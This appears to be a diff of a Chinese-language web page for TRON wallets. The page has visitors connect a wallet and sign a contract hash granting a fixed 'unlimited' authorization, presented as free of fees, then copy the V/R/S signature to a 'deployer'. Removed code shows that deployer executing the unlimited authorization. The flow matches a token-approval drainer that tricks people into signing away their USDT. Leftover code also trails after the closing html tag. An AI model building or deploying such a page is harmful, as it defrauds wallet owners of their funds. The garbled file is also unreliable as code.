@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>TRON通用代付授权工具</title>
+    <title>TRON代付授权（可复制VRS）</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -29,7 +29,6 @@
             margin-top: 10px;
         }
         .btn:disabled { background: #294b75; cursor: not-allowed; }
-        .btn-owner { background: #8b5cf6; }
         .wallet-tip { 
             color: #f97316; font-size: 13px; margin: 10px 0;
             padding: 8px; background: rgba(249, 115, 22, 0.1); border-radius: 4px;
@@ -39,54 +38,55 @@
             padding: 12px 20px; background: #1e2925; border: 1px solid #3b82f6;
             color: #e0e8e4; border-radius: 6px; display: none; z-index: 999;
         }
+        .guide {
+            font-size: 13px; color: #a0a8a4; margin-top: 15px;
+            line-height: 1.6;
+        }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="card-title">钱包状态</div>
+        <div class="card-title">授权者信息</div>
         <div class="info-item"><strong>钱包类型：</strong><span id="walletType">未检测到TRON钱包</span></div>
         <div class="info-item"><strong>钱包地址：</strong><span id="userAddr">未连接</span></div>
         <div class="wallet-tip" id="installTip" style="display: none;">
-            ⚠️ 未检测到TRON钱包，请安装TronLink/imToken/TokenPocket后重试
+            ⚠️ 请用TRON钱包（TronLink/imToken）打开本页面
         </div>
     </div>
 
     <div class="card">
-        <div class="card-title">授权者操作（零费用）</div>
+        <div class="card-title">授权参数</div>
         <div class="info-item"><strong>授权金额：</strong>无限（固定）</div>
         <div class="info-item"><strong>合约哈希：</strong></div>
         <div class="hash-display" id="contractHash">未生成</div>
     </div>
 
     <div class="card">
-        <div class="card-title">签名结果（复制给部署者）</div>
+        <div class="card-title">签名结果（手动复制发给部署者）</div>
         <div class="info-item"><strong>V值：</strong><span id="vValue">--</span></div>
         <div class="info-item"><strong>R值：</strong><span id="rValue">--</span></div>
         <div class="info-item"><strong>S值：</strong><span id="sValue">--</span></div>
     </div>
 
-    <div class="card" style="display: none;" id="ownerCard">
-        <div class="card-title">部署者操作</div>
-        <div class="info-item"><strong>授权者地址：</strong><input type="text" id="ownerUser" placeholder="输入授权者地址" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
-        <div class="info-item"><strong>V值：</strong><input type="text" id="ownerV" placeholder="输入V值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
-        <div class="info-item"><strong>R值：</strong><input type="text" id="ownerR" placeholder="输入R值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
-        <div class="info-item"><strong>S值：</strong><input type="text" id="ownerS" placeholder="输入S值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
-        <button id="executeBtn" class="btn btn-owner">执行无限授权</button>
-    </div>
-
-    <button id="connectBtn" class="btn" disabled>连接TRON钱包</button>
+    <button id="connectBtn" class="btn">连接TRON钱包</button>
     <button id="genHashBtn" class="btn" disabled>生成合约哈希</button>
     <button id="signBtn" class="btn" disabled>签名哈希（零费用）</button>
-    <button id="copyBtn" class="btn" disabled>复制V/R/S</button>
+    <button id="copyBtn" class="btn" disabled>复制V/R/S发给部署者</button>
+
+    <div class="guide">
+        操作指引：<br>
+        1. 连接TRON钱包（TronLink/imToken均可）<br>
+        2. 生成哈希→签名（无需支付任何费用）<br>
+        3. 复制结果发给部署者，完成授权
+    </div>
 
     <div class="toast" id="toast"></div>
 
     <script>
-        // 配置：替换为你的合约信息
+        // 配置：替换为你的合约信息（必填）
         const CONFIG = {
-            CONTRACT_ADDR: "THeU99vLEAS7Jym97cb1s3TnwQi6doTeX9", // 部署后替换
-            USDT_ADDR: "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf", // TRON主网USDT地址
-            OWNER_ADDR: "TP8EjMQKKKprVNVAkjnwyh41mvMW7666iG" // 部署合约的地址
+            CONTRACT_ADDR: "你的合约部署地址（Base58格式）", // 例：TXx...xxx
+            USDT_ADDR: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" // TRON主网USDT地址（固定）
         };
 
         let tronWeb = null;
@@ -94,108 +94,118 @@
         let contractInstance = null;
         let messageHash = "";
 
-        // 页面加载后检测TRON钱包
+        // 页面加载后初始化
         window.addEventListener('load', async () => {
+            // 绑定DOM元素
             const connectBtn = document.getElementById("connectBtn");
-            const installTip = document.getElementById("installTip");
+            const genHashBtn = document.getElementById("genHashBtn");
+            const signBtn = document.getElementById("signBtn");
+            const copyBtn = document.getElementById("copyBtn");
             const walletTypeEl = document.getElementById("walletType");
+            const userAddrEl = document.getElementById("userAddr");
+            const installTip = document.getElementById("installTip");
 
-            // 检测TRON钱包（兼容TronLink、imToken、TokenPocket等）
-            if (window.tronWeb) {
-                tronWeb = window.tronWeb;
-                // 监听钱包登录状态变化
-                tronWeb.on('addressChanged', async (newAddr) => {
-                    userAddress = newAddr;
-                    updateWalletStatus();
+            // 1. 等待TRON钱包（如TronLink）完全就绪
+            const waitForTronWeb = () => {
+                return new Promise((resolve) => {
+                    if (window.tronWeb && window.tronWeb.ready) {
+                        resolve(window.tronWeb);
+                    } else {
+                        // 监听TronLink专属就绪事件
+                        window.addEventListener('tronWebReady', () => {
+                            resolve(window.tronWeb);
+                        });
+                        // 兜底：3秒后重试
+                        setTimeout(() => resolve(window.tronWeb), 3000);
+                    }
                 });
-                // 初始化钱包状态
+            };
+
+            // 2. 初始化钱包
+            tronWeb = await waitForTronWeb();
+            if (tronWeb) {
+                // 识别钱包类型
                 walletTypeEl.textContent = getWalletType();
-                connectBtn.disabled = false;
                 installTip.style.display = "none";
+                // 初始化合约
+                contractInstance = tronWeb.contract().at(CONFIG.CONTRACT_ADDR);
+
+                // 3. 监听钱包地址变化（实时同步状态）
+                tronWeb.on('addressChanged', (newAddr) => {
+                    userAddress = newAddr;
+                    updatePageStatus();
+                });
+
+                // 4. 初始状态同步
+                updatePageStatus();
             } else {
-                // 未检测到钱包，提示安装
                 installTip.style.display = "block";
-                connectBtn.disabled = true;
             }
 
-            // 连接钱包按钮点击事件
-        // 替换原“连接钱包”的代码（connectBtn.onclick）
-connectBtn.onclick = async () => {
-    try {
-        connectBtn.disabled = true;
-        document.getElementById("loading").style.display = "block";
-        
-        // 兼容旧版钱包：直接获取已登录地址
-        if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-            userAddress = tronWeb.defaultAddress.base58;
-        } 
-        // 兼容新版钱包：使用request方法
-        else if (tronWeb.request) {
-            const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
-            userAddress = accounts[0];
-        } 
-        // 兜底：提示钱包不兼容
-        else {
-            throw new Error("当前钱包不支持TRON授权，请使用TronLink/新版imToken");
-        }
-
-        document.getElementById("step1").innerHTML = `步骤1：已连接钱包<br>地址：${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-        // 后续流程（生成哈希、签名等）保持不变
-    } catch (e) {
-        // 错误处理保持不变
-    }
-};
-
-            // 生成合约哈希按钮
-            document.getElementById("genHashBtn").onclick = async () => {
+            // 5. 连接钱包按钮逻辑
+            connectBtn.onclick = async () => {
                 try {
-                    if (!contractInstance) throw new Error("合约未初始化");
-                    // 调用合约generateHash方法（兼容TRON合约调用）
-                    messageHash = await contractInstance.generateHash(userAddress).call();
-                    document.getElementById("contractHash").textContent = messageHash;
-                    document.getElementById("genHashBtn").disabled = true;
-                    document.getElementById("signBtn").disabled = false;
-                    showToast("哈希生成成功");
+                    connectBtn.disabled = true;
+                    // TronLink/imToken通用授权
+                    const accounts = await tronWeb.trx.requestAccount();
+                    userAddress = accounts[0];
+                    updatePageStatus();
+                    showToast("钱包连接成功");
                 } catch (e) {
-                    showToast(`生成哈希失败：${e.message}`);
+                    showToast(`连接失败：${e.message}`);
+                    connectBtn.disabled = false;
                 }
             };
 
-            // 签名哈希按钮（TRON钱包通用签名）
-            document.getElementById("signBtn").onclick = async () => {
+            // 6. 生成合约哈希按钮逻辑
+            genHashBtn.onclick = async () => {
                 try {
-                    if (!messageHash) throw new Error("请先生成哈希");
-                    // TRON钱包通用签名逻辑（适配imToken/TronLink）
+                    genHashBtn.disabled = true;
+                    // 调用合约生成哈希
+                    messageHash = await contractInstance.generateHash(userAddress).call();
+                    document.getElementById("contractHash").textContent = messageHash;
+                    signBtn.disabled = false;
+                    showToast("合约哈希生成成功");
+                } catch (e) {
+                    showToast(`生成哈希失败：${e.message}`);
+                    genHashBtn.disabled = false;
+                }
+            };
+
+            // 7. 签名哈希按钮逻辑
+            signBtn.onclick = async () => {
+                try {
+                    signBtn.disabled = true;
+                    // 构造签名哈希（EIP-191标准）
                     const prefix = "\x19Ethereum Signed Message:\n32";
                     const prefixHex = asciiToHex(prefix);
                     const signedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true);
                     
-                    // 唤起钱包签名（兼容不同TRON钱包的返回格式）
+                    // 唤起钱包签名
                     let signature = await tronWeb.trx.sign(signedHash);
-                    signature = signature.signature || signature; // 适配部分钱包的返回结构
-                    if (!signature) throw new Error("钱包未返回签名");
+                    signature = signature.signature || signature;
+                    if (!signature) throw new Error("签名被拒绝");
 
-                    // 解析V/R/S（TRON签名标准格式）
+                    // 解析V/R/S
                     signature = signature.replace(/^0x/, "");
-                    if (signature.length !== 130) throw new Error("签名格式错误");
-                    const v = parseInt(signature.slice(128, 130), 16) + 27; // 修正V值
+                    const v = parseInt(signature.slice(128, 130), 16) + 27;
                     const r = "0x" + signature.slice(0, 64);
                     const s = "0x" + signature.slice(64, 128);
 
-                    // 显示签名结果
+                    // 显示结果
                     document.getElementById("vValue").textContent = v;
                     document.getElementById("rValue").textContent = r;
                     document.getElementById("sValue").textContent = s;
-                    document.getElementById("signBtn").disabled = true;
-                    document.getElementById("copyBtn").disabled = false;
-                    showToast("签名成功");
+                    copyBtn.disabled = false;
+                    showToast("签名成功，可复制V/R/S");
                 } catch (e) {
                     showToast(`签名失败：${e.message}`);
+                    signBtn.disabled = false;
                 }
             };
 
-            // 复制V/R/S按钮
-            document.getElementById("copyBtn").onclick = () => {
+            // 8. 复制V/R/S按钮逻辑
+            copyBtn.onclick = () => {
                 const content = `
 授权者地址：${userAddress}
 V值：${document.getElementById("vValue").textContent}
@@ -203,19 +213,62 @@ R值：${document.getElementById("rValue").textContent}
 S值：${document.getElementById("sValue").textContent}
                 `.trim();
                 navigator.clipboard.writeText(content).then(() => {
-                    showToast("V/R/S已复制");
+                    showToast("V/R/S已复制，发给部署者即可");
                 }).catch(() => {
-                    // 降级复制（兼容旧浏览器）
+                    // 旧浏览器兜底
                     const textarea = document.createElement("textarea");
                     textarea.value = content;
                     document.body.appendChild(textarea);
                     textarea.select();
                     document.execCommand("copy");
                     document.body.removeChild(textarea);
-                    showToast("V/R/S已手动复制");
+                    showToast("已手动复制V/R/S");
                 });
             };
 
+            // 辅助：更新页面+按钮状态
+            function updatePageStatus() {
+                if (userAddress) {
+                    userAddrEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+                    connectBtn.disabled = true;
+                    genHashBtn.disabled = false;
+                } else {
+                    userAddrEl.textContent = "未连接";
+                    connectBtn.disabled = false;
+                    genHashBtn.disabled = true;
+                    signBtn.disabled = true;
+                    copyBtn.disabled = true;
+                }
+            }
+
+            // 辅助：识别钱包类型
+            function getWalletType() {
+                if (window.tronLink) return "TronLink";
+                if (window.imToken) return "imToken";
+                if (window.tokenPocket) return "TokenPocket";
+                return "TRON钱包";
+            }
+
+            // 辅助：ASCII转Hex
+            function asciiToHex(str) {
+                let hex = "";
+                for (let i = 0; i < str.length; i++) {
+                    hex += str.charCodeAt(i).toString(16).padStart(2, "0");
+                }
+                return hex;
+            }
+
+            // 辅助：显示提示
+            function showToast(msg) {
+                const toast = document.getElementById("toast");
+                toast.textContent = msg;
+                toast.style.display = "block";
+                setTimeout(() => toast.style.display = "none", 3000);
+            }
+        });
+    </script>
+</body>
+</html>
             // 部署者执行授权按钮
             document.getElementById("executeBtn").onclick = async () => {
                 try {
